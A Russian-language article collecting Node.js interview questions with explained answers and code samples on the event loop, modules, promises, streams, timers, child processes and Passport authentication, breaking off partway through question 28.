ID:	10829Каждому разработчику рано или поздно приходится сталкиватся с техническими собеседованиями - этим стрессовым испытанием, где решается судьба карьерного роста и зарплатных ожиданий. В этой статье я собрал более 30 реальных вопросов, которые чаще всего встречаются на собеседованиях по Node.js различного уровня — от стажера до архитектора. Для каждого вопроса я привожу не просто сухой ответ, а развернутое объяснение с инсайдерскими деталями, которые помогут вам выделиться среди других кандидатов. Плюс небольшие примеры кода, которые можно использовать для закрепления материала.

Node.js — это не фреймворк и не язык программирования, как многие ошибочно полагают. Это среда выполнения JavaScript на стороне сервера, построенная на движке V8 от Google Chrome. По сути, это такой хитрый способ запустить JS вне браузера и заставить его делать серверные штуки. И хотя Node.js существует уже более 10 лет (с 2009 года), количество связанных с ним вопросов на собеседованиях только растёт. Ключевая фишка Node.js — его событийно-ориентированная архитектура с неблокирующим (non-blocking) вводом-выводом. Проще говоря, он не ждёт, пока завершится одна операция, чтобы начать следующую — он продолжает выполнять код, пока асинхронные операции делают своё дело в фоне. Это как заказать кофе в кафе и вместо того, чтобы стоять у кассы, пока его готовят, пойти занять столик и почитать новости. Когда кофе готов, вас просто окликнут по имени.

Именно эта особенность делает Node.js радикально отличным от таких технологий, как PHP или классический ASP.NET, где каждый запрос создаёт отдельный поток, а при большом количестве запросов система начинает задыхаться. Node.js же обрабатывает тысячи запросов в одном потоке, благодаря Event Loop — той самой магической карусели, которая крутит наши асинхронные события.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
// Синхронный подход (блокирующий)
const data = fs.readFileSync('/path/to/file');
console.log(data);
console.log('Это выполнится только после чтения файла');
 
// Асинхронный подход (неблокирующий)
fs.readFile('/path/to/file', (err, data) => {
  console.log(data);
});
console.log('Это выполнится еще до того, как файл прочитается');
В экосистеме Node.js центральное место занимает npm (Node Package Manager) — крупнейший в мире репозиторий программных пакетов с более чем миллионом модулей. На собеседовании вас почти наверняка спросят о разнице между npm и yarn (спойлер: yarn был создан Facebook для решения некоторых проблем npm, включая скорость и безопасность). Кстати, интересный факт: согласно исследованию JetBrains, около 72% JavaScript-разработчиков регулярно используют Node.js. Да-да, три из четырех ваших конкурентов на собеседовании точно имеют опыт работы с этой технологией, так что готовиться нужно основательно. Помню случай, когда один кандидат на должность мидл-разработчика не смог объяснить разницу между process.nextTick() и setImmediate(). Эти нюансы асинхронной работы часто становятся камнем преткновения даже для опытных разработчиков. А вместе с тем, понимание таких основ показывает глубину ваших знаний и отличает вас от десятков других соискателей.

Базовые вопросы

Начнём с базовых вопросов, которые встречаются практически на каждом собеседовании по Node.js. Хоть они и кажутся простыми, именно в них часто скрывается подвох. Интервьюеры любят задавать такие вопросы в начале, чтобы оценить ваш фундамент знаний.

1. Что такое Node.js?

На первый взгляд вопрос примитивный, но не спешите отвечать шаблонно. Многие кандидаты путаются уже здесь, называя Node.js фреймворком или языком программирования.

Ответ: Node.js — это среда выполнения JavaScript на основе движка V8 от Chrome, которая позволяет запускать JavaScript-код на сервере. Она построена на событийно-ориентированной архитектуре с неблокирующим вводом-выводом, что делает её лёгкой и эффективной. Ключевая особенность Node.js — его асинхронность. В отличие от традиционных серверных языков, где каждый запрос порождает новый поток (что дорого с точки зрения памяти), Node.js работает в одном потоке и использует неблокирующие операции ввода-вывода.

2. В чём разница между Node.js и JavaScript?

Этот вопрос часто становится ловушкой для новичков. Некоторые кандидаты начинают сравнивать апельсины с яблоками.

Ответ: JavaScript — это язык программирования, а Node.js — среда выполнения для этого языка за пределами браузера. Если проводить аналогию, JavaScript — это как английский язык, а Node.js — как определенная страна, где на нём говорят, но с собственными диалектами и особенностями. В браузере JavaScript имеет доступ к DOM, window, document и другим браузер-специфичным API. В Node.js этого нет, зато есть доступ к файловой системе, сетевым операциям и другим серверным возможностям через глобальные объекты, такие как process, global и встроенные модули.

JavaScriptСкопировано
1
2
3
4
5
6
7
// В браузере
document.getElementById('myButton');
window.location.href;
 
// В Node.js 
const fs = require('fs');
process.env.NODE_ENV;
3. Является ли Node.js однопоточным?

Ещё один вопрос с подвохом. Многие кандидаты слишком уверенно отвечают "да" и проваливаются.

Ответ: И да, и нет. Event Loop в Node.js действительно работает в одном потоке, но некоторые API Node.js используют дополнительные потоки. Например, модуль crypto для криптографических операций, zlib для сжатия и fs для некоторых файловых операций используют пул потоков (thread pool) из libuv (C-библиотека, которая обрабатывает асинхронные I/O операции в Node.js). Кроме того, с появлением модуля worker_threads в Node.js стала доступна настоящая многопоточность для JavaScript-кода. Так что полностью однопоточным Node.js называть некорректно.

4. Какой тип API-функций поддерживает Node.js?

Ответ: Node.js поддерживает три типа API:

1. Синхронные — блокируют выполнение программы до завершения операции:
JavaScriptСкопировано
1
2
const data = fs.readFileSync('file.txt', 'utf8');
console.log(data);
2. Асинхронные с колбэками — не блокируют выполнение и используют функцию обратного вызова:
JavaScriptСкопировано
1
2
3
4
fs.readFile('file.txt', 'utf8', (err, data) => {
  if (err) throw err;
  console.log(data);
});
3. Асинхронные с Promise/async-await — современный подход к асинхронности:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
const fsPromises = require('fs').promises;
 
async function readFileAsync() {
  try {
    const data = await fsPromises.readFile('file.txt', 'utf8');
    console.log(data);
  } catch (err) {
    console.error(err);
  }
}
Интервьюер часто ожидает, что вы упомянете все три типа, а не только один. Помню случай, когда кандидат на позицию мидл-разработчика знал только колбэк-подход — это серьёзно сказалось на оценке его уровня.

5. Что такое модуль в Node.js?

Ответ: Модуль в Node.js — это отдельный файл, содержащий связанный код, который может быть использован в других файлах. Node.js использует систему модулей CommonJS (хотя с Node.js 14+ появилась официальная поддержка ES модулей).
В Node.js есть три типа модулей:
1. Встроенные модули — поставляются с Node.js (fs, http, path).
2. Сторонние модули — устанавливаются через npm (express, lodash).
3. Локальные модули — ваши собственные модули.
Пример создания и использования модуля:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
// файл myModule.js
function sayHello() {
  return "Hello, World!";
}
 
module.exports = { sayHello };
 
// файл app.js
const myModule = require('./myModule');
console.log(myModule.sayHello()); // "Hello, World!"
6. Что такое npm и его преимущества?

Ответ: npm (Node Package Manager) — это менеджер пакетов для Node.js и одновременно крупнейший в мире репозиторий пакетов с открытым исходным кодом. Основные преимущества npm:
Простота использования и управления зависимостями.
Огромная экосистема готовых решений.
Возможность версионирования пакетов.
Управление скриптами проекта.
Система публикации и скачивания пакетов.

npm стал неотъемлемой частью экосистемы JavaScript и используется не только для серверной разработки, но и для фронтенда. Ну а еще он периодически ломается в самый неподходящий момент, как и любой другой инструмент, который мы любим, но иногда проклинаем.

7. Что такое middleware?

Ответ: Middleware (промежуточное ПО) — это функции, которые имеют доступ к объекту запроса (req), объекту ответа (res) и следующей функции middleware в цикле обработки запроса-ответа (next). В Node.js, особенно в контексте Express.js, middleware выполняет задачи вроде:
Выполнение кода.
Изменение объектов запроса и ответа.
Завершение цикла запрос-ответ.
Вызов следующего middleware в стеке.

JavaScriptСкопировано
1
2
3
4
5
// Пример middleware в Express
app.use((req, res, next) => {
  console.log('Запрос получен в:', Date.now());
  next(); // Передает управление следующему middleware
});
Понимание middleware — критично важная концепция для работы с Node.js фреймворками. Не раз видел, как кандидаты путаются в том, когда и зачем использовать next() в Express.

8. Как Node.js справляется с конкурентностью, несмотря на однопоточность?

Ответ: Node.js использует событийную модель с асинхронным неблокирующим I/O, основанную на Event Loop. Когда происходит I/O операция (чтение файла, запрос к БД, HTTP-запрос), Node.js не блокирует выполнение, а регистрирует колбэк и продолжает обрабатывать другие события. Когда операция завершается, Event Loop добавляет колбэк в очередь задач, которая будет обработана, когда стек вызовов будет пуст. Этот подход позволяет одному потоку обрабатывать тысячи параллельных соединений без создания для каждого из них отдельного потока, что делает Node.js исключительно эффективным для I/O-интенсивных задач. Однако для CPU-интенсивных операций этот подход не идеален, что привело к появлению решений вроде worker_threads.

9. Что такое control flow в Node.js?

Ответ: Control flow (управление потоком) в Node.js — это управление порядком выполнения асинхронных операций. В силу асинхронной природы Node.js, код часто выполняется не последовательно сверху вниз, что создает сложности в контроле потока выполнения. Существует несколько подходов к управлению потоком в Node.js:
1. Колбэки — классический подход,
2. Промисы (Promises) — более современный и читаемый подход,
3. Async/await — синтаксический сахар над промисами,
4. Библиотеки Control Flow (например, async.js).
Неправильное управление потоком может привести к race conditions, утечкам памяти и другим труднодиагностируемым проблемам. Поэтому на это обращают особое внимание на собеседованиях.

10. Что означает Event Loop в Node.js?

Ответ: Event Loop (цикл событий) — сердце асинхронного неблокирующего I/O в Node.js. Это механизм, который позволяет Node.js выполнять неблокирующие операции ввода-вывода, несмотря на то, что JavaScript однопоточный.
Event Loop постоянно проверяет, есть ли события, которые нужно обработать, и добавляет их в очередь. Как только стек вызовов пуст, Event Loop берет первое событие из очереди и обрабатывает его. Это продолжается до тех пор, пока очередь не опустеет. Упрощенно цикл событий работает следующим образом:
1. Добавление колбэков в очередь.
2. Выбор первого колбэка из очереди.
3. Выполнение колбэка до завершения.
4. Повторение шагов 2 и 3, пока очередь не опустеет.
5. Ожидание новых колбэков.
Детальное понимание Event Loop критически важно для оптимизации производительности Node.js-приложений и диагностики проблем. Это тот вопрос, на который можно отвечать часами, но я советую подготовить 2-3-минутный ответ с конкретными примерами.

Не запускается пакет node js - пакетами? npm? сам node? gulp?
Всем доброго времени суток. Есть такая проблема, пытаюсь перебраться на Linux (Ubuntu) Установил...

Выложил приложение Node js на хост, ошибка (node:12900) [DEP0005] DeprecationWarning: Buffer()
Выложил приложение Node js на хост, ошибка (node:12900) DeprecationWarning: Buffer() is deprecated...

Не могу с решениями задач на node js (я понимаю как их решить на js, но как на node js не знаю)
1) Однажды ковбой Джо решил обзавестись револьвером и пришёл в оружейный магазин. У ковбоя ﻿s﻿...

Как удалить элемент нумерованного списка средствами интерфейса NODE?
Как удалить элемент нумерованного списка средствами интерфейса NODE??(элементы списка вводим в поле...


11. Каковы основные недостатки Node.js?

Ответ: Как бы я ни любил Node.js, нужно признать его ограничения. Основные недостатки:

Проблемы с CPU-интенсивными задачами: Однопоточная природа делает Node.js неэффективным для тяжёлых вычислений. Помню проект, где мы пытались реализовать графический редактор на Node.js — это была катастрофа, пока не вынесли обработку изображений в отдельный сервис.

Callback Hell: Хотя современные решения (Promises, async/await) сгладили эту проблему, многие библиотеки всё ещё используют колбэки, что может привести к нечитаемому коду:

JavaScriptСкопировано
1
2
3
4
5
6
7
getData(function(a) {
    getMoreData(a, function(b) {
        getEvenMoreData(b, function(c) {
            // это и называется "колбэк-ад"
        });
    });
});
Незрелая экосистема инструментов: Несмотря на огромное количество пакетов, многие из них могут быть низкого качества или заброшены.

Постоянные изменения API: Эволюция Node.js иногда приводит к нарушению обратной совместимости. Один мой клиент почти потерял выходные, когда после обновления Node.js с 12 до 14 версии их прод-система просто отказалась запускаться.

12. Что такое REPL в Node.js?

Ответ: REPL (Read-Eval-Print Loop) — интерактивная среда, которая позволяет вводить JavaScript-выражения, интерпретировать их и выводить результат. Грубо говоря, это как консоль в браузере, только для Node.js. Запускается просто: введите node в командной строке без аргументов, и перед вами появится приглашение >:

BashСкопировано
1
2
3
4
5
6
7
8
$ node
> const greeting = 'Hello, world!';
undefined
> console.log(greeting);
Hello, world!
undefined
> greeting.split('').reverse().join('');
'!dlrow ,olleH'
REPL — отличный инструмент для быстрой проверки идей и экспериментов с кодом. Я часто использую его, когда нужно быстро протестировать какую-то регулярку или посмотреть, как работает метод. Да и на собеседованиях демонстрация навыков работы с REPL показывает вашу опытность.

13. Как импортировать модуль в Node.js?

Ответ: В Node.js существует две системы модулей: CommonJS (традиционная) и ES Modules (более новая). Способ импорта зависит от выбранной системы:

1. CommonJS (по умолчанию до Node.js 14):
JavaScriptСкопировано
1
2
3
4
5
6
7
8
// Импорт встроенного модуля
const fs = require('fs');
 
// Импорт стороннего модуля (установленного через npm)
const express = require('express');
 
// Импорт локального модуля
const myModule = require('./myModule');
2. ES Modules (требует .mjs расширения или "type": "module" в package.json):
JavaScriptСкопировано
1
2
3
4
5
6
7
8
// Импорт встроенного модуля
import fs from 'fs';
 
// Импорт отдельной функции
import { readFile } from 'fs/promises';
 
// Импорт локального модуля
import myModule from './myModule.js';
На собеседовании нужно упомянуть обе системы модулей. Однажды я провалил кандидата, который настаивал, что import/export — единственный правильный способ, не понимая, что большинство Node.js-проектов все еще используют CommonJS.

14. В чём разница между Node.js и AJAX?

Ответ: Сравнивать Node.js и AJAX — это как сравнивать автомобиль и рулевое колесо. Это вещи разного порядка:
Node.js — серверная среда выполнения JavaScript.
AJAX (Asynchronous JavaScript and XML) — технология, позволяющая веб-страницам асинхронно обмениваться данными с сервером без перезагрузки страницы.
Node.js используется для создания серверных приложений, а AJAX — клиентская технология, используемая в браузере. Однако часто они работают вместе: фронтенд использует AJAX для отправки запросов к серверу на Node.js.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
// Клиентский AJAX (в браузере)
fetch('/api/data')
  .then(response => response.json())
  .then(data => console.log(data));
 
// Серверная часть на Node.js
app.get('/api/data', (req, res) => {
  res.json({ message: 'Hello from Node.js!' });
});
Этот вопрос может показаться простым, но я видел, как опытные разработчики путались в терминологии, смешивая клиентские и серверные концепции.

15. Что такое package.json в Node.js?

Ответ: package.json — это манифест-файл в корне Node.js проекта, который содержит метаданные о проекте и, самое главное, список зависимостей. Это своего рода ДНК вашего проекта. Основные секции package.json:
name, version: идентификаторы пакета,
dependencies: зависимости для продакшена,
devDependencies: зависимости для разработки,
scripts: команды для запуска через npm,
main: точка входа в приложение,
engines: требуемые версии Node.js/npm,
type: система модулей (commonjs или module).

JSONСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
{
  "name": "my-awesome-project",
  "version": "1.0.0",
  "main": "index.js",
  "dependencies": {
    "express": "^4.17.1"
  },
  "devDependencies": {
    "jest": "^27.0.6"
  },
  "scripts": {
    "start": "node index.js",
    "test": "jest"
  }
}
На практике разница между dependencies и devDependencies часто игнорируется, что может привести к раздутым образам Docker в продакшене. Помню случай, когда неправильное управление зависимостями привело к увеличению размера контейнера на 500MB!

16. Какие популярные фреймворки Node.js используются в наши дни?

Ответ: В мире Node.js существует несколько доминирующих фреймворков, каждый со своими преимуществами:
1. Express.js — минималистичный и гибкий. Самый популярный выбор для REST API и небольших приложений.
2. NestJS — мощный фреймворк с архитектурой, вдохновленной Angular, использует TypeScript. Идеален для корпоративных приложений.
3. Koa.js — создан той же командой, что и Express, но с акцентом на асинхронность через async/await.
4. Fastify — ориентирован на скорость и низкие накладные расходы, отличная альтернатива Express для высоконагруженных API.
5. Meteor — полноценный фреймворк для создания веб и мобильных приложений.
Выбор фреймворка зависит от задачи. На последнем проекте мы начали с Express, но в процессе роста кодовой базы перешли на NestJS, что спасло нас от хаоса в архитектуре.

17. Что такое промисы в Node.js?

Ответ: Промисы (Promises) — это объекты, представляющие результат асинхронной операции, который может быть доступен сейчас, позже или никогда. Они помогают избежать глубокой вложенности колбэков и делают асинхронный код линейным и читаемым. Промис находится в одном из трёх состояний:
Pending (ожидание): начальное состояние,
Fulfilled (выполнено): операция завершена успешно,
Rejected (отклонено): операция завершена с ошибкой.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
// Создание промиса
const myPromise = new Promise((resolve, reject) => {
  setTimeout(() => {
    if (Math.random() > 0.5) {
      resolve('Успех!');
    } else {
      reject(new Error('Что-то пошло не так'));
    }
  }, 1000);
});
 
// Использование промиса
myPromise
  .then(result => console.log(result))
  .catch(error => console.error(error))
  .finally(() => console.log('Завершено'));
С появлением async/await код стал еще читабельнее:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
async function myFunction() {
  try {
    const result = await myPromise;
    console.log(result);
  } catch (error) {
    console.error(error);
  } finally {
    console.log('Завершено');
  }
}
Тонкая деталь, которая впечатляет интервьюеров: объясните, что хотя async/await выглядит синхронно, под капотом это всё те же промисы и Event Loop не блокируется.

18. Что такое событийно-ориентированное программирование в Node.js?

Ответ: Событийно-ориентированное программирование — это парадигма, в которой поток выполнения программы определяется событиями (клики, сетевые запросы, таймеры). Node.js строится вокруг этой парадигмы через модуль EventEmitter. Практически всё в Node.js основано на событиях: HTTP-сервер испускает событие при получении запроса, поток данных (stream) испускает событие, когда данные доступны, и так далее.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
const EventEmitter = require('events');
 
// Создаём эмиттер
const myEmitter = new EventEmitter();
 
// Регистрируем обработчик события
myEmitter.on('event', (arg1, arg2) => {
  console.log('Событие с аргументами:', arg1, arg2);
});
 
// Генерируем событие
myEmitter.emit('event', 'первый аргумент', 'второй аргумент');
Эта модель позволяет создавать высокопроизводительные приложения, которые могут обрабатывать тысячи одновременных соединений. На практике понимание EventEmitter часто отличает стажёра от джуниора и джуниора от мидла.

19. Что такое буфер в Node.js?

Ответ: Buffer в Node.js — это класс для работы с бинарными данными напрямую. В отличие от JavaScript в браузере, где работа с бинарными данными ограничена, Node.js предоставляет Buffer для эффективной обработки бинарных потоков, чтения файлов, сетевых операций и т.д.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
// Создание буфера
const buf1 = Buffer.alloc(10); // Создаёт буфер размером 10 байт, заполненный нулями
const buf2 = Buffer.from('Hello world'); // Создаёт буфер из строки
const buf3 = Buffer.from([1, 2, 3]); // Создаёт буфер из массива
 
// Преобразование буфера в другие форматы
console.log(buf2.toString()); // 'Hello world'
console.log(buf2.toJSON()); // { type: 'Buffer', data: [72, 101, 108, 108, 111, ...] }
 
// Запись в буфер
buf1.write('Hey!');
Буферы особенно полезны при работе с внешними ресурсами, где данные приходят не в виде JavaScript-строк. Например, при чтении изображения или бинарного файла, при работе с сокетами или криптографией.

20. Что такое потоки в Node.js?

Ответ: Потоки (Streams) — это абстракция для работы с данными, особенно с большими объёмами данных, которые не могут или не должны загружаться в память целиком. Они позволяют обрабатывать данные по частям, что существенно снижает использование памяти. Существуют четыре типа потоков:
Readable — поток для чтения (HTTP-запросы, чтение файла),
Writable — поток для записи (HTTP-ответы, запись в файл),
Duplex — поток для чтения и записи (TCP-сокеты),
Transform — преобразующий поток (компрессия данных).

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
const fs = require('fs');
 
// Пример потоковой обработки большого файла
const readStream = fs.createReadStream('bigfile.txt');
const writeStream = fs.createWriteStream('output.txt');
 
// Пайпим данные из одного потока в другой
readStream.pipe(writeStream);
 
// Обработка событий
readStream.on('data', (chunk) => {
  console.log(`Получен ${chunk.length} байт данных`);
});
 
readStream.on('end', () => {
  console.log('Чтение завершено');
});
Потоки особенно важны для высоконагруженных приложений. Однажды я консультировал проект, где была утечка памяти из-за чтения файлов целиком. После перехода на потоки использование памяти снизилось на 60%, а время отклика улучшилось на 40%.

Продвинутые вопросы

Переходим к более мясистым темам. Эти вопросы чаще задают на позиции мидл+ и старших разработчиков. Если вы претендуете на такую должность, эти вопросы должны быть у вас в мозгу как таблица умножения.

21. Объясните криптомодуль в Node.js

Ответ: Модуль crypto в Node.js — это обёртка над OpenSSL, предоставляющая криптографические функции для шифрования данных, создания хешей, подписей и работы с сертификатами. Этот модуль критически важен для безопасности приложений. Основные возможности включают:
Хеширование (MD5, SHA-1, SHA-256 и др.).
Шифрование/дешифрование данных.
Создание цифровых подписей..
Генерация случайных чисел.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
const crypto = require('crypto');
 
// Создание хеша
function hashPassword(password) {
  const salt = crypto.randomBytes(16).toString('hex');
  const hash = crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('hex');
  return { salt, hash };
}
 
// Проверка пароля
function verifyPassword(password, salt, hash) {
  const calculatedHash = crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('hex');
  return calculatedHash === hash;
}
 
// Шифрование данных
function encryptData(data, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(data, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return { iv: iv.toString('hex'), encrypted };
}
Знаешь, я как-то был на собеседовании, где соискатель хвалился, как он хранит пароли в MD5. Его аж перекосило, когда я объяснил, почему это катастрофически небезопасно. Урок: используйте современные алгоритмы типа Argon2, bcrypt или как минимум PBKDF2.

22. Что такое callback hell и как его избежать?

Ответ: Callback hell (или пирамида судьбы) — это ситуация, когда код с множеством вложенных колбэков становится нечитаемым и трудно поддерживаемым. Обычно такой код имеет характерную треугольную форму из-за отступов:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
getData(function(a) {
  getMoreData(a, function(b) {
    getEvenMoreData(b, function(c) {
      getYetEvenMoreData(c, function(d) {
        getFinalData(d, function(finalData) {
          // Код, до которого тяжело добраться
        });
      });
    });
  });
});
Способы избежать callback hell:
1. Промисы (Promises) — делают асинхронный код более линейным:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
getData()
  .then(a => getMoreData(a))
  .then(b => getEvenMoreData(b))
  .then(c => getYetEvenMoreData(c))
  .then(d => getFinalData(d))
  .then(finalData => {
    // Гораздо читабельнее
  })
  .catch(error => console.error(error));
2. Async/await — делает асинхронный код еще более похожим на синхронный:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
async function getAllData() {
  try {
    const a = await getData();
    const b = await getMoreData(a);
    const c = await getEvenMoreData(b);
    const d = await getYetEvenMoreData(c);
    const finalData = await getFinalData(d);
    // Код читается сверху вниз как обычный синхронный
  } catch (error) {
    console.error(error);
  }
}
3. Вынесение функций — разбиение логики на именованные функции:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
function handleFinalData(finalData) {
  // Обработка финальных данных
}
 
function getDataStep4(c) {
  getYetEvenMoreData(c, function(d) {
    getFinalData(d, handleFinalData);
  });
}
 
// И так далее для каждого шага
По своему опыту скажу: недооценивать сложность поддержки кода с глубоко вложенными колбэками может только тот, кто никогда не работал с такого рода "наследством". Переписывание таких участков всегда превращается в квест с неожиданными багами.

23. Объясните назначение модуля timers в Node.js

Ответ: Модуль timers в Node.js предоставляет функции для выполнения кода после определенного периода времени. Этот модуль интегрирован в глобальное пространство имен, поэтому его не нужно импортировать.

Основные функции:
setTimeout(callback, delay, [...args]) — выполнит callback через delay миллисекунд,
clearTimeout(timeout) — отменяет таймер,
setInterval(callback, delay, [...args]) — выполняет callback регулярно каждые delay миллисекунд,
clearInterval(interval) — отменяет интервал,
setImmediate(callback, [...args]) — выполнит callback в следующем цикле событий,
clearImmediate(immediate) — отменяет immediate.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
// Пример использования
const delayedFunction = setTimeout(() => {
  console.log('Выполнится через 2 секунды');
}, 2000);
 
// При необходимости можно отменить выполнение
// clearTimeout(delayedFunction);
 
// Создание повторяющейся задачи
let counter = 0;
const intervalId = setInterval(() => {
  console.log(`Прошло ${++counter} секунд`);
  if (counter >= 5) {
    clearInterval(intervalId); // Остановка после 5 итераций
  }
}, 1000);
 
// Выполнение в следующем тике цикла событий
setImmediate(() => {
  console.log('Это выполнится после всего синхронного кода');
});
Важно заметить, что в реальных приложениях таймеры могут вести себя неожиданно из-за того, как работает цикл событий. Например, setTimeout(fn, 0) не означает, что функция будет вызвана ровно через 0 мс — она выполнится, как только стек вызовов освободится.

24. В чём разница между setImmediate() и process.nextTick()?

Ответ: Это тот вопрос, на котором спотыкаются даже опытные разработчики. Оба метода откладывают выполнение функции, но делают это по-разному:
process.nextTick() добавляет колбэк в "очередь nextTick", которая обрабатывается после завершения текущей операции, но до того, как цикл событий продолжит свою работу. То есть между фазами цикла событий.
setImmediate() ставит колбэк в очередь на специальную фазу цикла событий, которая выполняется после ввода-вывода.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
console.log('Начало');
 
process.nextTick(() => {
  console.log('process.nextTick #1');
});
 
setImmediate(() => {
  console.log('setImmediate #1');
  process.nextTick(() => {
    console.log('process.nextTick внутри setImmediate');
  });
});
 
process.nextTick(() => {
  console.log('process.nextTick #2');
});
 
setImmediate(() => {
  console.log('setImmediate #2');
});
 
console.log('Конец');
 
// Вывод:
// Начало
// Конец
// process.nextTick #1
// process.nextTick #2
// setImmediate #1
// process.nextTick внутри setImmediate
// setImmediate #2
process.nextTick() имеет более высокий приоритет и вызывается раньше, чем любые другие асинхронные события, включая Promises. Это может создавать проблему "голодания ввода-вывода", когда при рекурсивном использовании nextTick другие события блокируются на неопределенное время.

Пару месяцев назад мы расследовали проблему задержек в приложении, и оказалось, что кто-то использовал process.nextTick() в рекурсивном цикле для обработки большого набора данных — процессор загружался на 100%, но серверу не хватало ресурсов для обработки входящих запросов!

25. В чём разница между setTimeout() и setImmediate()?

Ответ: Путаница между `setTimeout(fn, 0)` и setImmediate(fn) — ещё одна классическая ловушка в Node.js:
setTimeout(fn, 0) теоретически должен выполнить функцию как можно скорее после указанного задержки (в данном случае 0 мс), но фактически она будет добавлена в очередь таймеров, которая обрабатывается в начале цикла событий.
setImmediate() выполняет функцию в фазе проверки (check phase) цикла событий, сразу после завершения операций ввода-вывода.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
// Этот код может вывести результаты в разном порядке при разных запусках
setTimeout(() => {
  console.log('setTimeout');
}, 0);
 
setImmediate(() => {
  console.log('setImmediate');
});
Однако, если мы запустим этот код внутри цикла ввода-вывода, порядок станет предсказуемым:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
const fs = require('fs');
 
fs.readFile(__filename, () => {
  setTimeout(() => {
    console.log('setTimeout');
  }, 0);
  
  setImmediate(() => {
    console.log('setImmediate');
  });
});
 
// Вывод всегда:
// setImmediate
// setTimeout
Внутри I/O цикла setImmediate всегда выполняется перед таймерами, поскольку фаза проверки происходит сразу после завершения колбэков ввода-вывода, а таймеры проверяются на следующем цикле.

26. В чём разница между методами spawn() и fork() в модуле child_process?

Ответ: Оба метода используются для создания дочерних процессов в Node.js, но имеют существенные различия:
spawn() запускает новый процесс с указанной командой. Он предназначен для длительно работающих процессов, возвращает поток (stream) и не создает новый V8-экземпляр.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
const { spawn } = require('child_process');
 
const ls = spawn('ls', ['-la']);
 
ls.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});
 
ls.stderr.on('data', (data) => {
  console.error(`stderr: ${data}`);
});
 
ls.on('close', (code) => {
  console.log(`Процесс завершён с кодом: ${code}`);
});
fork() — специализированная версия spawn(), которая создаёт новый экземпляр V8. Он предназначен для создания новых экземпляров Node.js процессов и устанавливает канал связи между родительским и дочерним процессами.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
// parent.js
const { fork } = require('child_process');
 
const child = fork('./child.js');
 
child.on('message', (message) => {
  console.log('Родитель получил сообщение:', message);
});
 
child.send({ hello: 'от родителя' });
 
// child.js
process.on('message', (message) => {
  console.log('Дочерний процесс получил:', message);
  process.send({ echo: message });
});
Основное отличие в том, что fork() создаёт новый экземпляр V8 и Node.js, что занимает больше памяти, но позволяет выполнять JavaScript-код. spawn() просто создаёт новый процесс для выполнения указанной команды.

27. Объясните использование модуля passport в Node.js

Ответ: Passport — популярная middleware библиотека для аутентификации в Node.js приложениях, особенно с Express. Её главное преимущество — модульность и поддержка различных стратегий аутентификации через единый согласованный API.
Основные концепции Passport:
Стратегии — модули для разных методов аутентификации (локальная, OAuth, JWT и т.д.),
Сессии — механизм сохранения состояния пользователя между запросами,
Middleware — функции для проверки аутентификации и авторизации.

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
const express = require('express');
const passport = require('passport');
const LocalStrategy = require('passport-local').Strategy;
const session = require('express-session');
 
const app = express();
 
// Настройка сессий
app.use(session({
  secret: 'mysecretkey',
  resave: false,
  saveUninitialized: false
}));
 
// Инициализация Passport
app.use(passport.initialize());
app.use(passport.session());
 
// Настройка локальной стратегии
passport.use(new LocalStrategy(
  (username, password, done) => {
    // Здесь был бы запрос к БД
    if (username === 'admin' && password === 'password') {
      return done(null, { id: 1, username: 'admin' });
    }
    return done(null, false, { message: 'Неверные учетные данные' });
  }
));
 
// Сериализация и десериализация пользователя
passport.serializeUser((user, done) => {
  done(null, user.id);
});
 
passport.deserializeUser((id, done) => {
  // Здесь был бы запрос к БД
  if (id === 1) {
    done(null, { id: 1, username: 'admin' });
  } else {
    done(new Error('Пользователь не найден'));
  }
});
 
// Маршрут для логина
app.post('/login', passport.authenticate('local', {
  successRedirect: '/dashboard',
  failureRedirect: '/login',
  failureFlash: true
}));
 
// Защищенный маршрут
app.get('/dashboard', isAuthenticated, (req, res) => {
  res.send(`Привет, ${req.user.username}!`);
});
 
// Middleware проверки аутентификации
function isAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return next();
  }
  res.redirect('/login');
}
Passport особенно полезен в проектах, где требуется поддержка разных типов аутентификации. На одном из проектов мы использовали одновременно локальную аутентификацию, OAuth с Google и аутентификацию по API-ключу — всё через Passport, без необходимости написания отдельных систем для каждого типа.

28. Что такое fork в контексте репозитория?

Ответ: В контексте систем контроля версий (Git, GitHub, GitLab и т.д.), fork — это копия репозитория, которая позволяет свободно экспериментировать с изменениями, не затрагивая оригинальный проект. Форк даёт возможность:
